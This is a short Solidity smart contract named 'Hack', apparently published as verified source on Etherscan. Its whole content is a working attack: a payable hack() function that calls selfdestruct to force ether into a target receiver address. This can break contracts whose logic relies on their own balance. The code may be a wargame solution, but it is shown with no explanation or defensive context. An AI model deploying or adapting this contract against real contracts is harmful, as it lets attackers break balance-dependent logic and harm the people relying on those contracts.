/**
 *Submitted for verification at Etherscan.io on 2022-07-10
*/

pragma solidity ^0.6.0;

contract Hack {
  address payable public receiver;

  constructor(address  _receiver) public {
    receiver = payable(_receiver);
  }

  function hack() payable public {
    selfdestruct(receiver); 
  }
}